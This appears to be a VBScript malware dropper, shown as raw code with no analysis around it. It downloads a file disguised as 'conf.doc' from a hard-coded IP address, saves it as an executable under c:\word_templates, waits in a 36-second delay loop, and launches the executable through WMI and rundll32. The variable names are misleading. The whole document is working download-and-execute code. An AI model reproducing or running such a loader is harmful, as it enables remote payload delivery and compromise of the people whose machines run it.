Set oShell = CreateObject("Wscript.Shell")
strHomeFolder = oShell.ExpandEnvironmentStrings("%TEMP%")
ScriptArguments.Open "GET", "http://195.123.232.163/conf.doc", 0
ScriptArguments.Send
Set b = CreateObject("ADODB.Stream")
b.Open
b.Type = 1
HertzValue = ScriptArguments.Status
If HertzValue <> 200 Then
    WScript.Quit 1
End If

b.Write ScriptArguments.ResponseBody
b.Position = 0 + 0
Set a = CreateObject("Scripting.FileSystemObject")
If a.FileExists("c:\word_templates" + "\PDOKGLWEER.exe") Then a.DeleteFile "c:\word_templates" + "\PDOKGLWEER.exe"
b.SaveToFile "c:\word_templates" + "\PDOKGLWEER.exe"
b.Close

Dim temp

temp = Timer
Do While Timer - temp < 36
Loop

Dim obj1
Set obj1 = GetObject("winmgmts:Win32_Process")
obj1.Create "rundll32 URL.dll,FileProtocolHandler " + "c:\word_templates" + "\PDOKGLWEER.exe", Null, Null, processid
